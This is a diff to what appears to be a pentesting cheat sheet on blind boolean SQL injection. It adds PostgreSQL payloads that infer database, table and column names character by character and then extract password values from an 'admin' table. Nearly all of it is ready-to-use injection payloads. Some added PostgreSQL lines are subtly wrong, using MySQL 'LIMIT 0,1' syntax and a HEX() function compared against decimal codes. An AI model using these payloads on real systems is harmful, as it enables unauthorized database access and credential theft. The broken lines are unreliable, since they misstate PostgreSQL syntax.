@@ -45,7 +45,25 @@ Second, retrieve the database name:
 {% endtab %}
 
 {% tab title="PostgreSQL" %}
+First, retrieve the database length:
+
 ```sql
+1' AND (SELECT LENGTH(current_database()))=1--  #False  
+1' AND (SELECT LENGTH(current_database()))=2--  #False
+1' AND (SELECT LENGTH(current_database()))=3--  #True -> It means the length of database is 3 characters.
+```
+
+Second, retrieve the database name:
+
+```sql
+--True -> It means the first character is p. Note that ASCII code is in decimal
+1' AND (SELECT ASCII(SUBSTRING(current_database(), 1, 1)))=112-- 
+
+--True -> It means the second character is s.
+1' AND (SELECT ASCII(SUBSTRING(current_database(), 2, 1)))=115--
+
+--True -> It means the third character is s.
+1' AND (SELECT ASCII(SUBSTRING(current_database(), 3, 1)))=115--
 ```
 {% endtab %}
 
@@ -100,7 +118,33 @@ Third, retrieve name of each table
 {% endtab %}
 
 {% tab title="PostgreSQL" %}
+First, retrieve the number of tables:
+
 ```sql
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_database())=2-- #True -> 2 tables
+```
+
+Second, retrieve length of each table
+
+```sql
+-- If True, the first table lenght is 5
+1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=5--
+
+-- If True, the second table lenght is 5
+1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1,1)=5-- 
+```
+
+Third, retrieve name of each table
+
+```sql
+-- If True, the first char of the first table is u
+1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1))FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=117--
+
+-- If True, the second char of the first table is s
+1'AND (SELECT ASCII(SUBSTRING(table_name, 2, 1)) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 0,1)=115--
+
+-- If True, the first char of the second table is p
+1'AND (SELECT ASCII(SUBSTRING(table_name, 1, 1)) FROM information_schema.tables WHERE table_schema=current_database() LIMIT 1,1)=112--
 ```
 {% endtab %}
 
@@ -117,30 +161,30 @@ Third, retrieve name of each table
 First, retrieve the number of columns:
 
 ```sql
-1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='admin')=2-- -  #True -> 2 columns
+1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE')=2-- -  #True -> 2 columns
 ```
 
 Second, retrieve length of each column
 
 ```sql
 -- If True, the first column's name lenght is 3
-1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 0,1)=3-- - 
+1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=3-- - 
 
 -- If True, the second table's name lenght is 8
-1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 1,1)=8-- - 
+1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=8-- - 
 ```
 
 Third, retrieve name of each column
 
 ```sql
 -- If True, the first char of the first column is a
-1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 0,1)=HEX('a')-- -
+1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=HEX('a')-- -
 
 -- If True, the second char of the first column is b
-1'AND (SELECT HEX(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 0,1)=HEX('b')-- -
+1'AND (SELECT HEX(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=HEX('b')-- -
 
 -- If True, the first char of the second column is p
-1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='admin' LIMIT 1,1)=HEX('p')-- -
+1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=HEX('p')-- -
 ```
 {% endtab %}
 
@@ -155,12 +199,33 @@ Third, retrieve name of each column
 {% endtab %}
 
 {% tab title="PostgreSQL" %}
-```sql
-```
-{% endtab %}
+First, retrieve the number of columns:
 
-{% tab title="SQLite" %}
 ```sql
+1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE')=2--  #True -> 2 columns
+```
+
+Second, retrieve length of each column
+
+```sql
+-- If True, the first column's name lenght is 3
+1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=3-- 
+
+-- If True, the second table's name lenght is 8
+1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=8-- 
+```
+
+Third, retrieve name of each column
+
+```sql
+-- If True, the first char of the first column is a
+1'AND (SELECT ASCII(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=97--
+
+-- If True, the second char of the first column is b
+1'AND (SELECT HEX(SUBSTRING(column_name, 2, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 0,1)=98--
+
+-- If True, the first char of the second column is p
+1'AND (SELECT HEX(SUBSTRING(column_name, 1, 1))FROM information_schema.columns WHERE table_schema=current_database() AND table_name='TABLE_NAME_HERE' LIMIT 1,1)=112--
 ```
 {% endtab %}
 {% endtabs %}
@@ -169,7 +234,7 @@ Third, retrieve name of each column
 
 {% tabs %}
 {% tab title="MySQL" %}
-First, retrieve the lenght of the value (we take password column as example):
+First, retrieve the length of the value (we take password column as example):
 
 ```sql
 1' AND (SELECT LENGTH(password) FROM admin LIMIT 0,1)=9-- -  #True -> 1st password is 9 char
@@ -197,7 +262,20 @@ Second, retrieve values
 {% endtab %}
 
 {% tab title="PostgreSQL" %}
+First, retrieve the length of the value (we take password column as example):
+
 ```sql
+1' AND (SELECT LENGTH(password) FROM admin LIMIT 0,1)=9--  #True -> 1st password is 9 char
+```
+
+Second, retrieve values
+
+```sql
+-- If True, the first password's char is p
+1'AND (SELECT ASCII(SUBSTRING(password, 1, 1))FROM admin LIMIT 0,1)=112--
+
+-- If True, the second password's char is a
+1'AND (SELECT ASCII(SUBSTRING(password, 2, 1))FROM admin LIMIT 0,1)=97--
 ```
 {% endtab %}
 
